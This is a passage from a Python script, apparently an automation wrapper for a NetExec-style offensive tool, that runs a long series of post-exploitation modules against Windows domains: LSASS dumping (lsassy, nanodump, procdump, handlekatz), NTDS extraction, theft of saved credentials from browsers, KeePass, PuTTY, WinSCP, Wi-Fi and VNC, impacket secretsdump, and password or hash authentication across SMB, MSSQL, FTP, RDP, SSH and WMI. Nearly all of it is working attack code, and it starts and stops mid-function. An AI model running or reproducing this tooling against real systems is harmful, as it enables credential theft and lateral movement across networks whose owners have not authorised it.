    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting to check for Always Install Elevated{RESET}\n\n")
    subprocess.call([f"{cs} {crup} -M install_elevated >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    print(f"{YELLOW}Attempting to find keepass{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting to find keepass{RESET}\n\n")
    subprocess.call([f"{cs} {crup} -M keepass_discover >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    print(f"{YELLOW}Attempting lsassy{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting lsassy{RESET}\n\n")
    subprocess.call([f"{cs} {crudp} -M lsassy >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    print(f"{YELLOW}Attempting masky{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting masky{RESET}\n\n")
    subprocess.call([f"{cs} {crudp} -M masky >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content) 
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    print(f"{YELLOW}Attempting mobaxterm{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting mobaxterm{RESET}\n\n")
    subprocess.call([f"{cs} {crup} -M mobaxterm >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)      
    print(f"{YELLOW}Attempting msol{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting msol{RESET}\n\n")
    subprocess.call([f"{cs} {crup} -M msol >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)      
    print(f"{YELLOW}Attempting nanodump{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting nanodump{RESET}\n\n")
    subprocess.call([f"{cs} {crudp} -M nanodump >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)      
    print(f"{YELLOW}Attempting ntdsutil{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting ntdsutil{RESET}\n\n")
    subprocess.call([f"{cs} {crup} -M ntdsutil >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)      
    print(f"{YELLOW}Attempting ntlmv1{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting ntlmv1{RESET}\n\n")
    subprocess.call([f"{cs} {crudp} -M ntlmv1 >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)      
    print(f"{YELLOW}Attempting procdump{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting procdump{RESET}\n\n")
    subprocess.call([f"{cs} {crudp} -M procdump >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)      
    print(f"{YELLOW}Attempting putty{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting putty{RESET}\n\n")
    subprocess.call([f"{cs} {crup} -M putty >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)      
    print(f"{YELLOW}Attempting rdcman{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting rdcman{RESET}\n\n")
    subprocess.call([f"{cs} {crup} -M rdcman >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)      
    print(f"{YELLOW}Attempting recall{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting recall{RESET}\n\n")
    subprocess.call([f"{cs} {crup} -M recall >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)      
    print(f"{YELLOW}Attempting reg-query{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting reg-query{RESET}\n\n")
    subprocess.call([f"{cs} {crup} -M reg-query >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)      
    print(f"{YELLOW}Attempting reg-winlogon{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting reg-winlogon{RESET}\n\n")
    subprocess.call([f"{cs} {crup} -M reg-winlogon >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)      
    print(f"{YELLOW}Attempting runasppl{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting runasppl{RESET}\n\n")
    subprocess.call([f"{cs} {crudp} -M runasppl >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)      
    print(f"{YELLOW}Attempting uac{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting uac{RESET}\n\n")
    subprocess.call([f"{cs} {crup} -M uac >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)      
    print(f"{YELLOW}Attempting veeam{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting veeam{RESET}\n\n")
    subprocess.call([f"{cs} {crup} -M veeam >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)  
    print(f"{YELLOW}Attempting vnc{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting vnc{RESET}\n\n")
    subprocess.call([f"{cs} {crup} -M vnc >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)  
    print(f"{YELLOW}Attempting wcc{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting wcc{RESET}\n\n")
    subprocess.call([f"{cs} {crup} -M wcc >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)  
    print(f"{YELLOW}Attempting wifi{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting wifi{RESET}\n\n")
    subprocess.call([f"{cs} {crup} -M wifi >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)  
    print(f"{YELLOW}Attempting winscp{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting winscp{RESET}\n\n")
    subprocess.call([f"{cs} {crup} -M winscp >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)  

def SMBAHR():
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    print(f"{YELLOW}Attempting enum_dns{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting enum_dns{RESET}\n\n")
    subprocess.call([f"{cs} {crudh} -M enum_dns >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    print(f"{YELLOW}Attempting firefox dump{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting firefox dump{RESET}\n\n")
    subprocess.call([f"{cs} {cruh} -M firefox >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    print(f"{YELLOW}Attempting get_netconnections{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting get_netconnections{RESET}\n\n")
    subprocess.call([f"{cs} {cruh} -M get_netconnections >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    print(f"{YELLOW}Attempting lsass dump with handlekatz{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting lsass dump with handlekatz{RESET}\n\n")
    subprocess.call([f"{cs} {crudh} -M handlekatz >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    print(f"{YELLOW}Attempting to find creds in IIS{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting to find creds in IIS{RESET}\n\n")
    subprocess.call([f"{cs} {cruh} -M iis >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    print(f"{YELLOW}Attempting to list impersonate{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting to list impersonate{RESET}\n\n")
    subprocess.call([f"{cs} {cruh} -M impersonate >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    print(f"{YELLOW}Attempting to check for Always Install Elevated{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting to check for Always Install Elevated{RESET}\n\n")
    subprocess.call([f"{cs} {cruh} -M install_elevated >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    print(f"{YELLOW}Attempting to find keepass{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting to find keepass{RESET}\n\n")
    subprocess.call([f"{cs} {cruh} -M keepass_discover >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    print(f"{YELLOW}Attempting lsassy{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting lsassy{RESET}\n\n")
    subprocess.call([f"{cs} {crudh} -M lsassy >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    print(f"{YELLOW}Attempting masky{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting masky{RESET}\n\n")
    subprocess.call([f"{cs} {crudh} -M masky >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content) 
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)    
    print(f"{YELLOW}Attempting mobaxterm{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting mobaxterm{RESET}\n\n")
    subprocess.call([f"{cs} {cruh} -M mobaxterm >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)      
    print(f"{YELLOW}Attempting msol{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting msol{RESET}\n\n")
    subprocess.call([f"{cs} {cruh} -M msol >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)      
    print(f"{YELLOW}Attempting nanodump{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting nanodump{RESET}\n\n")
    subprocess.call([f"{cs} {crudh} -M nanodump >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)      
    print(f"{YELLOW}Attempting ntdsutil{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting ntdsutil{RESET}\n\n")
    subprocess.call([f"{cs} {cruh} -M ntdsutil >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)      
    print(f"{YELLOW}Attempting ntlmv1{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting ntlmv1{RESET}\n\n")
    subprocess.call([f"{cs} {crudh} -M ntlmv1 >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)      
    print(f"{YELLOW}Attempting procdump{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting procdump{RESET}\n\n")
    subprocess.call([f"{cs} {crudh} -M procdump >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)      
    print(f"{YELLOW}Attempting putty{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting putty{RESET}\n\n")
    subprocess.call([f"{cs} {cruh} -M putty >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)      
    print(f"{YELLOW}Attempting rdcman{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting rdcman{RESET}\n\n")
    subprocess.call([f"{cs} {cruh} -M rdcman >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)      
    print(f"{YELLOW}Attempting recall{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting recall{RESET}\n\n")
    subprocess.call([f"{cs} {cruh} -M recall >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)      
    print(f"{YELLOW}Attempting reg-query{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting reg-query{RESET}\n\n")
    subprocess.call([f"{cs} {cruh} -M reg-query >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)      
    print(f"{YELLOW}Attempting reg-winlogon{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting reg-winlogon{RESET}\n\n")
    subprocess.call([f"{cs} {cruh} -M reg-winlogon >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)      
    print(f"{YELLOW}Attempting runasppl{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting runasppl{RESET}\n\n")
    subprocess.call([f"{cs} {crudh} -M runasppl >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)      
    print(f"{YELLOW}Attempting uac{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting uac{RESET}\n\n")
    subprocess.call([f"{cs} {cruh} -M uac >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)      
    print(f"{YELLOW}Attempting veeam{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting veeam{RESET}\n\n")
    subprocess.call([f"{cs} {cruh} -M veeam >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)  
    print(f"{YELLOW}Attempting vnc{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting vnc{RESET}\n\n")
    subprocess.call([f"{cs} {cruh} -M vnc >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)  
    print(f"{YELLOW}Attempting wcc{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting wcc{RESET}\n\n")
    subprocess.call([f"{cs} {cruh} -M wcc >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)  
    print(f"{YELLOW}Attempting wifi{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting wifi{RESET}\n\n")
    subprocess.call([f"{cs} {cruh} -M wifi >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)  
    print(f"{YELLOW}Attempting winscp{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting winscp{RESET}\n\n")
    subprocess.call([f"{cs} {cruh} -M winscp >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)  

def MSSQLPR():
    print(f"{YELLOW}Attempting MSSQL Enumeration with Username {USERNAME} and Password {PASSWORD}{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting MSSQL Enumeration{RESET}\n\n")
    subprocess.call([f"{cm} {crup} mssql >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Attempting MSSQL Privs{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting MSSQL Privs{RESET}\n\n")
    subprocess.call([f"{cm} {crup} -M mssql_priv >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)  
    print(f"{YELLOW}Attempting MSSQL Local Auth{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting MSSQL Local Auth{RESET}\n\n")
    subprocess.call([f"{cm} {crup} --local-auth >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Attempting MSSQL Commands{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting MSSQL Commands{RESET}\n\n")
    subprocess.call([f"{cm} {crup} -x whoami >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)

def MSSQLHR():
    print(f"{YELLOW}Attempting MSSQL Enumeration with Username {USERNAME} and Password {PASSWORD}{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting MSSQL Enumeration{RESET}\n\n")
    subprocess.call([f"{cm} {cruh} mssql >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Attempting MSSQL Privs{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting MSSQL Privs{RESET}\n\n")
    subprocess.call([f"{cm} {cruh} -M mssql_priv >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)  
    print(f"{YELLOW}Attempting MSSQL Local Auth{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting MSSQL Local Auth{RESET}\n\n")
    subprocess.call([f"{cm} {cruh} --local-auth >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Attempting MSSQL Commands{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Attempting MSSQL Commands{RESET}\n\n")
    subprocess.call([f"{cm} {cruh} -x whoami >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)

def FTPN():
    print(f"{YELLOW}Checking for NULL FTP{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}NULL FTP{RESET}\n\n")
    subprocess.call([f"{cf} {crun} --ls >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Checking for NULL FTP{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}NULL FTP{RESET}\n\n")
    subprocess.call([f"{cf} {crun1} --ls >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Checking for NULL FTP{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}NULL FTP{RESET}\n\n")
    subprocess.call([f"{cf} {crun2} --ls >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)

def FTPP():
    print(f"{YELLOW}Checking for FTP with Username {USERNAME} and Password {PASSWORD}{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}FTP{RESET}\n\n")
    subprocess.call([f"{cf} {crup} --ls >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)

def FTPH():
    print(f"{YELLOW}Checking for FTP with Username {USERNAME} and Hash {HASH}{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}FTP{RESET}\n\n")
    subprocess.call([f"{cf} {cruh} --ls >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)

def RDPP():
    print(f"{YELLOW}Checking for RDP with Username {USERNAME} and Password {PASSWORD}{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}RDP{RESET}\n\n")
    subprocess.call([f"{cr} {crup} >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)

def RDPH():
    print(f"{YELLOW}Checking for RDP with Username {USERNAME} and Hash {HASH}{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}RDP{RESET}\n\n")
    subprocess.call([f"{cr} {crup} >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)

def VNCN():
    print(f"{YELLOW}Checking for NULL VNC{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}VNC Null{RESET}\n\n")
    subprocess.call([f"{cv} {crun} >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Checking for NULL VNC{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}VNC Null{RESET}\n\n")
    subprocess.call([f"{cv} {crun1} >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)
    print(f"{YELLOW}Checking for NULL VNC{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}VNC Null{RESET}\n\n")
    subprocess.call([f"{cv} {crun2} >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)

def VNCRP():
    print(f"{YELLOW}Checking for VNC with Username {USERNAME} and Password {PASSWORD}{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}VNC with username and password{RESET}\n\n")
    subprocess.call([f"{cv} {crup} >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)

def VNCRH():
    print(f"{YELLOW}Checking for VNC with Username {USERNAME} and Hash {HASH}{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}VNC with username and hash{RESET}\n\n")
    subprocess.call([f"{cv} {cruh} >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)

def SSHRP():
    print(f"{YELLOW}Checking for SSH with Username {USERNAME} and Password {PASSWORD}{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}SSH with username and password{RESET}\n\n")
    subprocess.call([f"{ch} {crup} >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)

def SSHRH():
    print(f"{YELLOW}Checking for SSH with Username {USERNAME} and Hash {HASH}{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}SSH with username and hash{RESET}\n\n")
    subprocess.call([f"{ch} {cruh} >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)

def WMIRP():
    print(f"{YELLOW}Checking for WMI with Username {USERNAME} and Password {PASSWORD}{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}WMI with username and password{RESET}\n\n")
    subprocess.call([f"{cwm} {crup} >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)

def WMIRH():
    print(f"{YELLOW}Checking for WMI with Username {USERNAME} and Hash {HASH}{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}WMI with username and hash{RESET}\n\n")
    subprocess.call([f"{cwm} {cruh} >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)

def IMPAP():
    print(f"{YELLOW}Running Impacket with Username {USERNAME} and Password {PASSWORD} as admin{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
        f.write(f"{GREEN}Secrets Dump{RESET}\n\n")
    subprocess.call([f"{isec} >> {DOMAIN}{fi}.txt"], shell=True)
    with open (f"{DOMAIN}{fi}.txt", "r") as f:
        content = f.read()
        print(content)

def IMPAH():
    print(f"{YELLOW}Running Impacket with Username {USERNAME} and Password {PASSWORD} as admin{RESET}\n\n")
    with open(f"{DOMAIN}{fi}.txt", "a") as f:
